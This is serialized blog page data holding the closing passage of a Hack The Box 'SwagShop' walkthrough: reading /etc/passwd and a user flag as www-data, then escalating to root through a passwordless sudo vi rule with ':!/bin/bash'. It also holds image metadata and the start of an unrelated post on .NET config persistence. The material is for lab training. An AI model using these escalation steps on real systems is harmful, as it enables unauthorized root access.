/etc/passwd\\n\\u2514> cat /etc/passwd\\n   root:x:0:0:root:/root:/bin/bash\\n   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\n   bin:x:2:2:bin:/bin:/usr/sbin/nologin\\n   sys:x:3:3:sys:/dev:/usr/sbin/nologin\\n   sync:x:4:65534:sync:/bin:/bin/sync\\n   games:x:5:60:games:/usr/games:/usr/sbin/nologin\\n   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\n   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\n   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\n   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\n   uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\n   proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\n   www-data:x:33:33:www-data:/var/www:/bin/bash\\n   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\n   list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\n   irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\\n   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:...\\n   nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n   systemd-timesync:x:100:102:systemd Time Synchronization,,,:...\\n   systemd-network:x:101:103:systemd Network Management,,,:...\\n   systemd-resolve:x:102:104:systemd Resolver,,,:...\\n   systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/...\\n   syslog:x:104:108::/home/syslog:/bin/false\\n   _apt:x:105:65534::/nonexistent:/bin/false\\n   lxd:x:106:65534::/var/lib/lxd/:/bin/false\\n   mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false\\n   messagebus:x:108:112::/var/run/dbus:/bin/false\\n   uuidd:x:109:113::/run/uuidd:/bin/false\\n   dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false\\n   sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin\\n   haris:x:1000:1000:haris,,,:/home/haris:/bin/bash\\n\")), mdx(\"p\", null, \"we notice the user \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"haris\"), \" \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C www-data@swagshop:/$ ls -alh /home/haris\\n\\u2514> ls -alh /home/haris\\n   total 36K\\n   drwxr-xr-x 3 haris haris 4.0K May  8 09:21 .\\n   drwxr-xr-x 3 root  root  4.0K May  2 14:48 ..\\n   -rw------- 1 haris haris   54 May  2 14:56 .Xauthority\\n   lrwxrwxrwx 1 root  root     9 May  8 09:20 .bash_history -> /dev/null\\n   -rw-r--r-- 1 haris haris  220 May  2 14:48 .bash_logout\\n   -rw-r--r-- 1 haris haris 3.7K May  2 14:48 .bashrc\\n   drwx------ 2 haris haris 4.0K May  2 14:49 .cache\\n   -rw------- 1 root  root     1 May  8 09:20 .mysql_history\\n   -rw-r--r-- 1 haris haris  655 May  2 14:48 .profile\\n   -rw-r--r-- 1 haris haris    0 May  2 14:49 .sudo_as_admin_successful\\n   -rw-r--r-- 1 haris haris   33 May  8 09:01 user.txt\\n\\n\")), mdx(\"p\", null, \"we find \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"user.txt\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C www-data@swagshop:/$ cat /home/haris/user.txt\\n\\u2514> cat /home/haris/user.txt\\n   <user flag>\\n\")), mdx(\"h2\", {\n    \"id\": \"❯-privilege-escalation-own-root\"\n  }, \"\\u276F Privilege Escalation: Own Root\"), mdx(\"p\", null, \"Enumerating the system leads to the finding that \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"sudo -l\"), \" returns the\\nlist of the user\\u2019s privileges, and shows that running \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"vi\"), \" with a specific path \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"/var/www/html/*\"), \"\\ngrants superuser privileges, without a password entry, required\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C www-data@swagshop:/$ sudo -l\\n\\u2514> sudo -l\\n   Matching Defaults entries for www-data on swagshop:\\n       env_reset, mail_badpass,\\n       secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\\\n       :/sbin\\\\:/bin\\\\:/snap/bin\\n   \\n   User www-data may run the following commands on swagshop:\\n       (root) NOPASSWD: /usr/bin/vi /var/www/html/*\\n\")), mdx(\"p\", null, \"open a file using \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"vi\"), \" in \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"/var/www/html/*\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C www-data@swagshop:/$ sudo /usr/bin/vi /var/www/html/Bad3r.sh\\n\\u2514> sudo /usr/bin/vi /var/www/html/Bad3r.sh\\n   Vim: Warning: Output is not to a terminal\\n   Vim: Warning: Input is not from a terminal\\n   \\n   E558: Terminal entry not found in terminfo\\n   \\u2018unknown\\u2019 not known. Available builtin terminals are:\\n    builtin_amiga\\n    builtin_beos-ansi\\n    builtin_ansi\\n    builtin_pcansi\\n    builtin_win32\\n    builtin_vt320\\n    builtin_vt52\\n    builtin_xterm\\n    builtin_iris-ansi\\n    builtin_debug\\n    builtin_dumb\\n   defaulting to \\u2018ansi\\u2019\\n\")), mdx(\"p\", null, \"inside \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"vi\"), \" you can spawn a root shell\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \":!/bin/bash\\n~\\n~\\n\")), mdx(\"p\", null, \"in the interactive shell, we can get the root flag\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C whoami\\n\\u2514> root\\n\\u2022\\u279C cat /root/root.txt\\n     <root flag>\\n        ___ ___\\n      /| |/|\\\\| |\\\\\\n     /_| \\xB4 |.` |_\\\\           We are open! (Almost)\\n     |     | .   |                                   |\\n     | --- | --- | --------------------------------- |\\n     |     | .   | Join the beta HTB Swag Store!     |\\n     | ___ | .__ | https://hackthebox.store/password |\\n   \\n                      PS: Use root flag as password!\\n\")));\n}\n;\nMDXContent.isMDXComponent = true;","hero":{"full":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAMABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAAAAMC/8QAFQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAcJmrIB//8QAHBAAAgICAwAAAAAAAAAAAAAAAAECEgMRExQx/9oACAEBAAEFAtYSPWbhxJVKJHh//8QAFREBAQAAAAAAAAAAAAAAAAAAACH/2gAIAQMBAT8BR//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8BP//EABoQAAIDAQEAAAAAAAAAAAAAAAERAAISIDH/2gAIAQEABj8Csbay/BENuI1Ni+P/xAAaEAEAAwEBAQAAAAAAAAAAAAABABExIUGx/9oACAEBAAE/ISys4GhOAFNFsuRBWyid97ksCbsrB8n/2gAMAwEAAgADAAAAEBDv/8QAFhEBAQEAAAAAAAAAAAAAAAAAACEB/9oACAEDAQE/EGRX/8QAFREBAQAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8Qh//EABwQAQACAgMBAAAAAAAAAAAAAAEAESExYXGR0f/aAAgBAQABPxBuDNjJXeoT2c9pwsZyoFac9wWNFYpl85gYqCBow+QN6QW9Pk//2Q==","aspectRatio":1.6619718309859155,"src":"/static/3a3ddea7cc206a68af35140e2b2fa47a/58fe7/SwagShop_Hack_The_Box_Walkthrough.jpg","srcSet":"/static/3a3ddea7cc206a68af35140e2b2fa47a/e0f30/SwagShop_Hack_The_Box_Walkthrough.jpg 236w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/86afd/SwagShop_Hack_The_Box_Walkthrough.jpg 472w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/58fe7/SwagShop_Hack_The_Box_Walkthrough.jpg 944w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/02748/SwagShop_Hack_The_Box_Walkthrough.jpg 1416w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/5c241/SwagShop_Hack_The_Box_Walkthrough.jpg 1888w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/5dbbf/SwagShop_Hack_The_Box_Walkthrough.jpg 2048w","srcWebp":"/static/3a3ddea7cc206a68af35140e2b2fa47a/99fbb/SwagShop_Hack_The_Box_Walkthrough.webp","srcSetWebp":"/static/3a3ddea7cc206a68af35140e2b2fa47a/77392/SwagShop_Hack_The_Box_Walkthrough.webp 236w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/1f177/SwagShop_Hack_The_Box_Walkthrough.webp 472w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/99fbb/SwagShop_Hack_The_Box_Walkthrough.webp 944w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/4a492/SwagShop_Hack_The_Box_Walkthrough.webp 1416w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/b0b8f/SwagShop_Hack_The_Box_Walkthrough.webp 1888w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/ceab5/SwagShop_Hack_The_Box_Walkthrough.webp 2048w","sizes":"(max-width: 944px) 100vw, 944px"},"regular":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAMABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAAAAMC/8QAFQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAcJmrIB//8QAHBAAAgICAwAAAAAAAAAAAAAAAAECEgMRExQx/9oACAEBAAEFAtYSPWbhxJVKJHh//8QAFREBAQAAAAAAAAAAAAAAAAAAACH/2gAIAQMBAT8BR//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8BP//EABoQAAIDAQEAAAAAAAAAAAAAAAERAAISIDH/2gAIAQEABj8Csbay/BENuI1Ni+P/xAAaEAEAAwEBAQAAAAAAAAAAAAABABExIUGx/9oACAEBAAE/ISys4GhOAFNFsuRBWyid97ksCbsrB8n/2gAMAwEAAgADAAAAEBDv/8QAFhEBAQEAAAAAAAAAAAAAAAAAACEB/9oACAEDAQE/EGRX/8QAFREBAQAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8Qh//EABwQAQACAgMBAAAAAAAAAAAAAAEAESExYXGR0f/aAAgBAQABPxBuDNjJXeoT2c9pwsZyoFac9wWNFYpl85gYqCBow+QN6QW9Pk//2Q==","aspectRatio":1.663265306122449,"src":"/static/3a3ddea7cc206a68af35140e2b2fa47a/1dc0b/SwagShop_Hack_The_Box_Walkthrough.jpg","srcSet":"/static/3a3ddea7cc206a68af35140e2b2fa47a/3a5ce/SwagShop_Hack_The_Box_Walkthrough.jpg 163w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/05730/SwagShop_Hack_The_Box_Walkthrough.jpg 327w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/1dc0b/SwagShop_Hack_The_Box_Walkthrough.jpg 653w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/f72c7/SwagShop_Hack_The_Box_Walkthrough.jpg 980w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/6e4a3/SwagShop_Hack_The_Box_Walkthrough.jpg 1306w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/5dbbf/SwagShop_Hack_The_Box_Walkthrough.jpg 2048w","srcWebp":"/static/3a3ddea7cc206a68af35140e2b2fa47a/0acdf/SwagShop_Hack_The_Box_Walkthrough.webp","srcSetWebp":"/static/3a3ddea7cc206a68af35140e2b2fa47a/ac59e/SwagShop_Hack_The_Box_Walkthrough.webp 163w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/7660b/SwagShop_Hack_The_Box_Walkthrough.webp 327w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/0acdf/SwagShop_Hack_The_Box_Walkthrough.webp 653w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/75470/SwagShop_Hack_The_Box_Walkthrough.webp 980w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/68d47/SwagShop_Hack_The_Box_Walkthrough.webp 1306w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/ceab5/SwagShop_Hack_The_Box_Walkthrough.webp 2048w","sizes":"(max-width: 653px) 100vw, 653px"},"narrow":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAMABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAAAAMC/8QAFQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAcJmrIB//8QAHBAAAgICAwAAAAAAAAAAAAAAAAECEgMRExQx/9oACAEBAAEFAtYSPWbhxJVKJHh//8QAFREBAQAAAAAAAAAAAAAAAAAAACH/2gAIAQMBAT8BR//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8BP//EABoQAAIDAQEAAAAAAAAAAAAAAAERAAISIDH/2gAIAQEABj8Csbay/BENuI1Ni+P/xAAaEAEAAwEBAQAAAAAAAAAAAAABABExIUGx/9oACAEBAAE/ISys4GhOAFNFsuRBWyid97ksCbsrB8n/2gAMAwEAAgADAAAAEBDv/8QAFhEBAQEAAAAAAAAAAAAAAAAAACEB/9oACAEDAQE/EGRX/8QAFREBAQAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8Qh//EABwQAQACAgMBAAAAAAAAAAAAAAEAESExYXGR0f/aAAgBAQABPxBuDNjJXeoT2c9pwsZyoFac9wWNFYpl85gYqCBow+QN6QW9Pk//2Q==","aspectRatio":1.6521739130434783,"src":"/static/3a3ddea7cc206a68af35140e2b2fa47a/eaa58/SwagShop_Hack_The_Box_Walkthrough.jpg","srcSet":"/static/3a3ddea7cc206a68af35140e2b2fa47a/5a3ee/SwagShop_Hack_The_Box_Walkthrough.jpg 114w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/41f8f/SwagShop_Hack_The_Box_Walkthrough.jpg 229w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/eaa58/SwagShop_Hack_The_Box_Walkthrough.jpg 457w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/c309b/SwagShop_Hack_The_Box_Walkthrough.jpg 686w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/e3008/SwagShop_Hack_The_Box_Walkthrough.jpg 914w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/5dbbf/SwagShop_Hack_The_Box_Walkthrough.jpg 2048w","srcWebp":"/static/3a3ddea7cc206a68af35140e2b2fa47a/15384/SwagShop_Hack_The_Box_Walkthrough.webp","srcSetWebp":"/static/3a3ddea7cc206a68af35140e2b2fa47a/31fce/SwagShop_Hack_The_Box_Walkthrough.webp 114w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/e3e25/SwagShop_Hack_The_Box_Walkthrough.webp 229w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/15384/SwagShop_Hack_The_Box_Walkthrough.webp 457w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/0258d/SwagShop_Hack_The_Box_Walkthrough.webp 686w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/64ea2/SwagShop_Hack_The_Box_Walkthrough.webp 914w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/ceab5/SwagShop_Hack_The_Box_Walkthrough.webp 2048w","sizes":"(max-width: 457px) 100vw, 457px"},"seo":{"src":"/static/3a3ddea7cc206a68af35140e2b2fa47a/0ff54/SwagShop_Hack_The_Box_Walkthrough.jpg"}}},"authors":[{"authorsPage":true,"bio":"","id":"7d10d71b-c61b-5055-bd88-2fd3db1bbd98","name":"Bad3r","featured":true,"social":[{"url":"https://twitter.com/0xBad3r"},{"url":"https://github.com/Bad3r"}],"slug":"/authors/Bad3r","avatar":{"small":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAUABQDASIAAhEBAxEB/8QAGAABAQEBAQAAAAAAAAAAAAAAAAMEAgb/xAAWAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAdMb8Zs0RTWannQf/8QAGhAAAgMBAQAAAAAAAAAAAAAAAQIAAxIEMf/aAAgBAQABBQIs4lVrmsWswKvBpi7KCo3Z1nPP5P/EABYRAAMAAAAAAAAAAAAAAAAAAAAQIf/aAAgBAwEBPwEr/8QAFxEAAwEAAAAAAAAAAAAAAAAAAAEREP/aAAgBAgEBPwGEW//EACAQAAIBBAEFAAAAAAAAAAAAAAERAAISITEiEEFRYZH/2gAIAQEABj8COjxepVcMgMGO4fI7ddgYVshZEXHHuEVErxCun//EABoQAQADAQEBAAAAAAAAAAAAAAEAESFBMYH/2gAIAQEAAT8hzj4tUjD9gYdIXN85g0KSgowPEOwYUVrAXL8YMtkQjq8jwT//2gAMAwEAAgADAAAAEBzwQ//EABcRAAMBAAAAAAAAAAAAAAAAAAABERD/2gAIAQMBAT8QrLr/xAAYEQACAwAAAAAAAAAAAAAAAAAAARBRYf/aAAgBAgEBPxBJRnP/xAAcEAEBAAMBAQEBAAAAAAAAAAABEQAhMVFBYZH/2gAIAQEAAT8QJDLKyXzr+ZPm8xAHacZh+qtNcU9/MMGEsIFvh9MnhHQo6Ufjf5ho2mAq7gTeIsndARJzHxEDnilxrE1LvP/Z","aspectRatio":1,"src":"/static/bbc5a0350725e4142bf5961aa8b10636/fa1ea/avatar.jpg","srcSet":"/static/bbc5a0350725e4142bf5961aa8b10636/afb2b/avatar.jpg 13w,\n/static/bbc5a0350725e4142bf5961aa8b10636/7c20e/avatar.jpg 25w,\n/static/bbc5a0350725e4142bf5961aa8b10636/fa1ea/avatar.jpg 50w,\n/static/bbc5a0350725e4142bf5961aa8b10636/03612/avatar.jpg 75w,\n/static/bbc5a0350725e4142bf5961aa8b10636/61cdf/avatar.jpg 100w,\n/static/bbc5a0350725e4142bf5961aa8b10636/3bf7d/avatar.jpg 640w","srcWebp":"/static/bbc5a0350725e4142bf5961aa8b10636/e7b2c/avatar.webp","srcSetWebp":"/static/bbc5a0350725e4142bf5961aa8b10636/58718/avatar.webp 13w,\n/static/bbc5a0350725e4142bf5961aa8b10636/74aad/avatar.webp 25w,\n/static/bbc5a0350725e4142bf5961aa8b10636/e7b2c/avatar.webp 50w,\n/static/bbc5a0350725e4142bf5961aa8b10636/ed320/avatar.webp 75w,\n/static/bbc5a0350725e4142bf5961aa8b10636/66016/avatar.webp 100w,\n/static/bbc5a0350725e4142bf5961aa8b10636/f461a/avatar.webp 640w","sizes":"(max-width: 50px) 100vw, 50px"},"medium":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAUABQDASIAAhEBAxEB/8QAGAABAQEBAQAAAAAAAAAAAAAAAAMEAgb/xAAWAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAdMb8Zs0RTWannQf/8QAGhAAAgMBAQAAAAAAAAAAAAAAAQIAAxIEMf/aAAgBAQABBQIs4lVrmsWswKvBpi7KCo3Z1nPP5P/EABYRAAMAAAAAAAAAAAAAAAAAAAAQIf/aAAgBAwEBPwEr/8QAFxEAAwEAAAAAAAAAAAAAAAAAAAEREP/aAAgBAgEBPwGEW//EACAQAAIBBAEFAAAAAAAAAAAAAAERAAISITEiEEFRYZH/2gAIAQEABj8COjxepVcMgMGO4fI7ddgYVshZEXHHuEVErxCun//EABoQAQADAQEBAAAAAAAAAAAAAAEAESFBMYH/2gAIAQEAAT8hzj4tUjD9gYdIXN85g0KSgowPEOwYUVrAXL8YMtkQjq8jwT//2gAMAwEAAgADAAAAEBzwQ//EABcRAAMBAAAAAAAAAAAAAAAAAAABERD/2gAIAQMBAT8QrLr/xAAYEQACAwAAAAAAAAAAAAAAAAAAARBRYf/aAAgBAgEBPxBJRnP/xAAcEAEBAAMBAQEBAAAAAAAAAAABEQAhMVFBYZH/2gAIAQEAAT8QJDLKyXzr+ZPm8xAHacZh+qtNcU9/MMGEsIFvh9MnhHQo6Ufjf5ho2mAq7gTeIsndARJzHxEDnilxrE1LvP/Z","aspectRatio":1,"src":"/static/bbc5a0350725e4142bf5961aa8b10636/61cdf/avatar.jpg","srcSet":"/static/bbc5a0350725e4142bf5961aa8b10636/7c20e/avatar.jpg 25w,\n/static/bbc5a0350725e4142bf5961aa8b10636/fa1ea/avatar.jpg 50w,\n/static/bbc5a0350725e4142bf5961aa8b10636/61cdf/avatar.jpg 100w,\n/static/bbc5a0350725e4142bf5961aa8b10636/59538/avatar.jpg 150w,\n/static/bbc5a0350725e4142bf5961aa8b10636/fd013/avatar.jpg 200w,\n/static/bbc5a0350725e4142bf5961aa8b10636/3bf7d/avatar.jpg 640w","srcWebp":"/static/bbc5a0350725e4142bf5961aa8b10636/66016/avatar.webp","srcSetWebp":"/static/bbc5a0350725e4142bf5961aa8b10636/74aad/avatar.webp 25w,\n/static/bbc5a0350725e4142bf5961aa8b10636/e7b2c/avatar.webp 50w,\n/static/bbc5a0350725e4142bf5961aa8b10636/66016/avatar.webp 100w,\n/static/bbc5a0350725e4142bf5961aa8b10636/d9b14/avatar.webp 150w,\n/static/bbc5a0350725e4142bf5961aa8b10636/6b183/avatar.webp 200w,\n/static/bbc5a0350725e4142bf5961aa8b10636/f461a/avatar.webp 640w","sizes":"(max-width: 100px) 100vw, 100px"},"large":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAUABQDASIAAhEBAxEB/8QAGAABAQEBAQAAAAAAAAAAAAAAAAMEAgb/xAAWAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAdMb8Zs0RTWannQf/8QAGhAAAgMBAQAAAAAAAAAAAAAAAQIAAxIEMf/aAAgBAQABBQIs4lVrmsWswKvBpi7KCo3Z1nPP5P/EABYRAAMAAAAAAAAAAAAAAAAAAAAQIf/aAAgBAwEBPwEr/8QAFxEAAwEAAAAAAAAAAAAAAAAAAAEREP/aAAgBAgEBPwGEW//EACAQAAIBBAEFAAAAAAAAAAAAAAERAAISITEiEEFRYZH/2gAIAQEABj8COjxepVcMgMGO4fI7ddgYVshZEXHHuEVErxCun//EABoQAQADAQEBAAAAAAAAAAAAAAEAESFBMYH/2gAIAQEAAT8hzj4tUjD9gYdIXN85g0KSgowPEOwYUVrAXL8YMtkQjq8jwT//2gAMAwEAAgADAAAAEBzwQ//EABcRAAMBAAAAAAAAAAAAAAAAAAABERD/2gAIAQMBAT8QrLr/xAAYEQACAwAAAAAAAAAAAAAAAAAAARBRYf/aAAgBAgEBPxBJRnP/xAAcEAEBAAMBAQEBAAAAAAAAAAABEQAhMVFBYZH/2gAIAQEAAT8QJDLKyXzr+ZPm8xAHacZh+qtNcU9/MMGEsIFvh9MnhHQo6Ufjf5ho2mAq7gTeIsndARJzHxEDnilxrE1LvP/Z","aspectRatio":1,"src":"/static/bbc5a0350725e4142bf5961aa8b10636/ec46e/avatar.jpg","srcSet":"/static/bbc5a0350725e4142bf5961aa8b10636/a2637/avatar.jpg 82w,\n/static/bbc5a0350725e4142bf5961aa8b10636/15203/avatar.jpg 164w,\n/static/bbc5a0350725e4142bf5961aa8b10636/ec46e/avatar.jpg 328w,\n/static/bbc5a0350725e4142bf5961aa8b10636/b69a5/avatar.jpg 492w,\n/static/bbc5a0350725e4142bf5961aa8b10636/3bf7d/avatar.jpg 640w","srcWebp":"/static/bbc5a0350725e4142bf5961aa8b10636/5a48e/avatar.webp","srcSetWebp":"/static/bbc5a0350725e4142bf5961aa8b10636/2d087/avatar.webp 82w,\n/static/bbc5a0350725e4142bf5961aa8b10636/29d87/avatar.webp 164w,\n/static/bbc5a0350725e4142bf5961aa8b10636/5a48e/avatar.webp 328w,\n/static/bbc5a0350725e4142bf5961aa8b10636/42f2e/avatar.webp 492w,\n/static/bbc5a0350725e4142bf5961aa8b10636/f461a/avatar.webp 640w","sizes":"(max-width: 328px) 100vw, 328px"}}}],"basePath":"/","permalink":"https://secbytes.net//SwagShop-Hack-The-Box-Writeup/","slug":"/SwagShop-Hack-The-Box-Writeup","id":"f40b36c8-8b4e-5be7-9e35-b4dbf89d41e4","title":"SwagShop Hack The Box Writeup","canonicalUrl":null,"mailchimp":false,"next":[{"id":"b53ebc3d-c52f-5220-abff-9d1dd43b47fd","slug":"/Configuring-our-Machine-for-Persistence","secret":false,"title":"Configuring our Machine for Persistence","author":"NotoriousRebel","date":"February 24th, 2020","dateForSEO":"2020-02-24T00:00:00.000Z","timeToRead":5,"excerpt":"CLR Hooking for Persistence via Config Files","canonical_url":null,"subscription":true,"body":"function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"Configuring our Machine for Persistence\",\n  \"author\": \"NotoriousRebel\",\n  \"date\": \"2020-02-24T00:00:00.000Z\",\n  \"hero\": \"./images/binding.jpg\",\n  \"excerpt\": \"CLR Hooking for Persistence via Config Files\"\n};\n\nvar makeShortcode = function makeShortcode(name) {\n  return function MDXDefaultShortcode(props) {\n    console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n    return mdx(\"div\", props);\n  };\n};\n\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, [\"components\"]);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"h3\", {\n    \"id\": \"introduction\"\n  }, \"Introduction\"), mdx(\"p\", null, \"Preparing for an upcoming red teaming competition and \\u201Cbecoming\\u201D one with the MSDN documents,\\nI stumbled across something very interesting. You may have noticed that when you create an .NET Framework application\\nwith Visual Studio an app.config is created.\\nA typical app.config looks like:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-xml\"\n  }), \"<?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\" ?>\\n<configuration>\\n    <startup> \\n        <supportedRuntime version=\\\"v4.0\\\" sku=\\\".NETFramework,Version=v4.7.2\\\" />\\n    </startup>\\n</configuration>\\n\")), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Configuration: Root element in every configuration file used by the Common Language Runtime  (CLR) and .NET Framework applications\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Startup: Element specifies the CLR startup information\"), 